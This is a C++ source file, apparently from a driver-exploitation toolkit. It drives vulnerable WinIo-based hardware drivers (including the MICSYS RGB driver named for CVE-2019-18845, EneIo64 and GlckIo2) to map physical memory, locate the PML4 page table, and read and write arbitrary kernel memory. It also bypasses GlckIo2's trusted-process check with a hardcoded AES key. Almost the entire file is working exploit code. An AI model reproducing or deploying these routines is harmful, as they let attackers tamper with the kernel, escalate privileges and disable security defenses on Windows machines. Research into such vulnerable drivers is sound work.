/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020
*
*  TITLE:       WINIO.CPP
*
*  VERSION:     1.01
*
*  DATE:        12 Feb 2020
*
*  WINIO based drivers routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/winio.h"

#ifdef __cplusplus
extern "C" {
#include "tinyaes/aes.h"
}
#endif

//
// Generic WINIO interface for all supported drivers based on WINIO code.
//
// MICSYS RGB driver interface for CVE-2019-18845.
// Ptolemy Tech Co., Ltd ENE driver interface
// G.Skill EneIo64 driver interface
// ... and multiple others
//

typedef PVOID(WINAPI* pfnWinIoGenericMapMemory)(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes,
    _Out_ HANDLE* SectionHandle,
    _Out_ PVOID* ReferencedObject);

typedef VOID(WINAPI* pfnWinIoGenericUnmapMemory)(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID SectionToUnmap,
    _In_ HANDLE SectionHandle,
    _In_ PVOID ReferencedObject);


pfnWinIoGenericMapMemory g_WinIoMapMemoryRoutine;
pfnWinIoGenericUnmapMemory g_WinIoUnmapMemoryRoutine;
BOOL g_PhysAddress64bit = FALSE;

/*
* WinIoCallDriver
*
* Purpose:
*
* Call WinIo driver.
*
*/
BOOL WinIoCallDriver(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG IoControlCode,
    _In_ PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _In_opt_ PVOID OutputBuffer,
    _In_opt_ ULONG OutputBufferLength)
{
    BOOL bResult = FALSE;
    IO_STATUS_BLOCK ioStatus;

    NTSTATUS ntStatus = NtDeviceIoControlFile(DeviceHandle,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        IoControlCode,
        InputBuffer,
        InputBufferLength,
        OutputBuffer,
        OutputBufferLength);

    bResult = NT_SUCCESS(ntStatus);
    SetLastError(RtlNtStatusToDosError(ntStatus));
    return bResult;
}

/*
* MsIoMapMemory
*
* Purpose:
*
* Map physical memory through \Device\PhysicalMemory.
*
*/
PVOID MsIoMapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes,
    _Out_ HANDLE* SectionHandle,
    _Out_ PVOID* ReferencedObject)
{
    MSIO_PHYSICAL_MEMORY_INFO request;

    *SectionHandle = NULL;
    *ReferencedObject = NULL;

    RtlSecureZeroMemory(&request, sizeof(request));
    request.ViewSize = PhysicalAddress + NumberOfBytes;

    if (WinIoCallDriver(DeviceHandle,
        IOCTL_WINIO_MAP_USER_PHYSICAL_MEMORY,
        &request,
        sizeof(request),
        &request,
        sizeof(request)))
    {
        *SectionHandle = request.SectionHandle;
        *ReferencedObject = request.ReferencedObject;
        return request.BaseAddress;
    }

    return NULL;
}

/*
* MsIoUnmapMemory
*
* Purpose:
*
* Unmap previously mapped physical memory.
*
*/
VOID MsIoUnmapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID SectionToUnmap,
    _In_ HANDLE SectionHandle,
    _In_ PVOID ReferencedObject
)
{
    MSIO_PHYSICAL_MEMORY_INFO request;

    RtlSecureZeroMemory(&request, sizeof(request));
    request.BaseAddress = SectionToUnmap;
    request.ReferencedObject = ReferencedObject;
    request.SectionHandle = SectionHandle;

    WinIoCallDriver(DeviceHandle,
        IOCTL_WINIO_UNMAP_USER_PHYSICAL_MEMORY,
        &request,
        sizeof(request),
        &request,
        sizeof(request));
}

/*
* WinIoMapMemory
*
* Purpose:
*
* Map physical memory through \Device\PhysicalMemory.
*
*/
PVOID WinIoMapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes,
    _Out_ HANDLE* SectionHandle,
    _Out_ PVOID* ReferencedObject)
{
    WINIO_PHYSICAL_MEMORY_INFO request;

    *SectionHandle = NULL;
    *ReferencedObject = NULL;

    RtlSecureZeroMemory(&request, sizeof(request));
    request.ViewSize = NumberOfBytes;
    request.BusAddress = PhysicalAddress;

    if (WinIoCallDriver(DeviceHandle,
        IOCTL_WINIO_MAP_USER_PHYSICAL_MEMORY,
        &request,
        sizeof(request),
        &request,
        sizeof(request)))
    {
        *SectionHandle = request.SectionHandle;
        *ReferencedObject = request.ReferencedObject;
        return request.BaseAddress;
    }

    return NULL;
}

/*
* WinIoUnmapMemory
*
* Purpose:
*
* Unmap previously mapped physical memory.
*
*/
VOID WinIoUnmapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID SectionToUnmap,
    _In_ HANDLE SectionHandle,
    _In_ PVOID ReferencedObject
)
{
    WINIO_PHYSICAL_MEMORY_INFO request;

    RtlSecureZeroMemory(&request, sizeof(request));
    request.BaseAddress = SectionToUnmap;
    request.ReferencedObject = ReferencedObject;
    request.SectionHandle = SectionHandle;

    WinIoCallDriver(DeviceHandle,
        IOCTL_WINIO_UNMAP_USER_PHYSICAL_MEMORY,
        &request,
        sizeof(request),
        &request,
        sizeof(request));
}


/*
* WinIoQueryPML4Value
*
* Purpose:
*
* Locate PML4.
*
*/
BOOL WINAPI WinIoQueryPML4Value(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value)
{
    DWORD dwError = ERROR_SUCCESS;
    ULONG_PTR pbLowStub1M = 0ULL, PML4 = 0;

    PVOID refObject = NULL;
    HANDLE sectionHandle = NULL;

    *Value = 0;

    do {

        pbLowStub1M = (ULONG_PTR)g_WinIoMapMemoryRoutine(DeviceHandle,
            0ULL,
            0x100000,
            &sectionHandle,
            &refObject);

        if (pbLowStub1M == 0) {
            dwError = GetLastError();
            break;
        }

        PML4 = supGetPML4FromLowStub1M(pbLowStub1M);
        if (PML4)
            *Value = PML4;
        else
            *Value = 0;

        g_WinIoUnmapMemoryRoutine(DeviceHandle,
            (PVOID)pbLowStub1M,
            sectionHandle,
            refObject);

        dwError = ERROR_SUCCESS;

    } while (FALSE);

    SetLastError(dwError);
    return (PML4 != 0);
}

/*
* WinIoReadWritePhysicalMemory
*
* Purpose:
*
* Read/Write physical memory.
*
*/
BOOL WINAPI WinIoReadWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes,
    _In_ BOOLEAN DoWrite)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PVOID mappedSection = NULL;
    ULONG_PTR offset;

    PVOID refObject = NULL;
    HANDLE sectionHandle = NULL;

    //
    // Map physical memory section.
    //
    mappedSection = g_WinIoMapMemoryRoutine(DeviceHandle,
        PhysicalAddress,
        NumberOfBytes,
        &sectionHandle,
        &refObject);

    if (mappedSection) {

        offset = PhysicalAddress;

        __try {

            if (DoWrite) {
                if (g_PhysAddress64bit) {
                    RtlCopyMemory(mappedSection, Buffer, NumberOfBytes);
                }
                else {
                    RtlCopyMemory(RtlOffsetToPointer(mappedSection, offset), Buffer, NumberOfBytes);
                }
            }
            else {
                if (g_PhysAddress64bit) {
                    RtlCopyMemory(Buffer, mappedSection, NumberOfBytes);
                }
                else {
                    RtlCopyMemory(Buffer, RtlOffsetToPointer(mappedSection, offset), NumberOfBytes);
                }
            }

            bResult = TRUE;
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            SetLastError(GetExceptionCode());
            bResult = FALSE;
        }

        //
        // Unmap physical memory section.
        //
        g_WinIoUnmapMemoryRoutine(DeviceHandle,
            mappedSection,
            sectionHandle,
            refObject);

    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}

/*
* WinIoReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory.
*
*/
BOOL WINAPI WinIoReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return WinIoReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        FALSE);
}

/*
* WinIoWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI WinIoWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return WinIoReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        TRUE);
}

/*
* WinIoVirtualToPhysical
*
* Purpose:
*
* Translate virtual address to the physical.
*
*/
BOOL WINAPI WinIoVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    BOOL bResult = FALSE;

    if (PhysicalAddress)
        *PhysicalAddress = 0;
    else {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    bResult = PwVirtualToPhysical(DeviceHandle,
        (provQueryPML4)WinIoQueryPML4Value,
        (provReadPhysicalMemory)WinIoReadPhysicalMemory,
        VirtualAddress,
        PhysicalAddress);

    return bResult;
}

/*
* WinIoReadKernelVirtualMemory
*
* Purpose:
*
* Read virtual memory.
*
*/
BOOL WINAPI WinIoReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;
    DWORD dwError = ERROR_SUCCESS;

    bResult = WinIoVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = WinIoReadWritePhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes,
            FALSE);

        if (!bResult)
            dwError = GetLastError();

    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}

/*
* WinIoWriteKernelVirtualMemory
*
* Purpose:
*
* Write virtual memory.
*
*/
BOOL WINAPI WinIoWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;
    DWORD dwError = ERROR_SUCCESS;

    bResult = WinIoVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = WinIoReadWritePhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes,
            TRUE);

        if (!bResult)
            dwError = GetLastError();

    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}

/*
* GlckIo2Register
*
* Purpose:
*
* Register in GlckIo2 "trusted" process list.
*
*/
BOOL GlckIo2Register(
    _In_ HANDLE DeviceHandle)
{
    AES_ctx ctx;
    ULONG_PTR encryptedProcessId;
    UCHAR Buffer[16];
    BYTE OutBuf[512];
    ULONG AES128Key[4] = { 0x16157eaa, 0xa6d2ae28, 0x8815f7ab, 0x3c4fcf09 };

    RtlSecureZeroMemory(&ctx, sizeof(ctx));

    AES_init_ctx(&ctx, (uint8_t*)&AES128Key);

    encryptedProcessId = SWAP_UINT32(GetCurrentProcessId());

    RtlSecureZeroMemory(&Buffer, sizeof(Buffer));
    RtlCopyMemory(&Buffer, &encryptedProcessId, sizeof(ULONG_PTR));
    AES_ECB_encrypt(&ctx, (uint8_t*)&Buffer);

    return WinIoCallDriver(DeviceHandle,
        IOCTL_GKCKIO2_REGISTER,
        &Buffer,
        sizeof(Buffer),
        &OutBuf,
        sizeof(OutBuf));
}

/*
* WinIoRegisterDriver
*
* Purpose:
*
* Register WinIo driver.
*
*/
BOOL WINAPI WinIoRegisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param)
{ 
    ULONG DriverId = PtrToUlong(Param);

    switch (DriverId) {
    case IDR_GLCKIO2:
        g_WinIoMapMemoryRoutine = WinIoMapMemory;
        g_WinIoUnmapMemoryRoutine = WinIoUnmapMemory;
        g_PhysAddress64bit = TRUE;

        if (!GlckIo2Register(DeviceHandle))
            return FALSE;

        break;

    case IDR_MSIO64:
        g_WinIoMapMemoryRoutine = MsIoMapMemory;
        g_WinIoUnmapMemoryRoutine = MsIoUnmapMemory;
        g_PhysAddress64bit = FALSE;
        break;
    default:
        g_WinIoMapMemoryRoutine = WinIoMapMemory;
        g_WinIoUnmapMemoryRoutine = WinIoUnmapMemory;
        g_PhysAddress64bit = TRUE;
        break;
    }

    return TRUE;
}
